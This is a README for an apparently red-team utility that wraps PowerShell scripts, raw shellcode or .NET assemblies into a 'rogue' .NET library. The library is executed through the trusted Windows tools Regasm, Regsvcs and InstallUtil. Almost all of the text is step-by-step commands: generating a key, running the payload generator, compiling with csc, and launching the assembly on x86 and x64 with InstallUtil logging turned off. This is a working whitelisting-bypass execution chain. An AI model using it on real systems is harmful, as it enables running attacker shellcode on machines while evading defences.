## Rogue .NET Assembly for Regsvcs/Regasm/InstallUtil Code Execution

Follow below described steps to properly generate your source code and then compile it into a nice rogue .NET Assembly ready to be executed by:

- [Regasm](https://lolbas-project.github.io/lolbas/Binaries/Regasm/)
- [Regsvcs](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/)
- [InstallUtil](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)

### Step 1: Generate key.snk file

```
powershell -file build.ps1
```

### Step 2: Generate source code file

Included in this directory script is a helper utility allowing one to quickly generate desired csharp source code file to be used for further `csc` compilation.

Usage:

```
python3 generateRogueDotNet.py --help

        :: Rogue .NET Source Code Generation Utility
        To be used during Red-Team assignments to launch Powershell/Shellcode payloads via Regsvcs/Regasm/InstallUtil.
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

usage: .\generateRogueDotNet.py [options] <inputFile>

positional arguments:
  inputFile   Input file to be embeded within C# code. May be either Powershell script, raw binary Shellcode or .NET Assembly (PE/EXE) file.

optional arguments:
  -h, --help  show this help message and exit
  -e, --exe   Specified input file is an Mono/.Net assembly PE/EXE. WARNING: Launching EXE is currently possible ONLY WITH MONO/.NET assembly EXE/DLL files, not an ordinary native PE/EXE!
  -r, --raw   Specified input file is a raw Shellcode to be injected in self process in a separate Thread.
```

Sample use case:

```
python3 generateRogueDotNet.py -r notepad64.bin > program.cs

        :: Rogue .NET Source Code Generation Utility
        To be used during Red-Team assignments to launch Powershell/Shellcode payloads via Regsvcs/Regasm/InstallUtil.
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

[?] File specified as raw Shellcode.

```


###  Step 3: Compilate library .NET Assembly

```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs
```
 
If you passed Powershell code to be launched in a .NET Runspace, then an additional assembly will have to be used to compile resulting source code properly - meaning System.Management.Automation.dll (provided with this script). Then proper compilation command will be:

```
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.Management.Automation.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs
```


### Step 4: Code execution via Regsvcs, Regasm or InstallUtil:

- x86:
```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe rogue.dll
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U rogue.dll

%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe rogue.dll
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U rogue.dll 

%WINDIR%\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
```

- x64:
```
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe rogue.dll
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U rogue.dll

%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe rogue.dll
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U rogue.dll 

%WINDIR%\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
```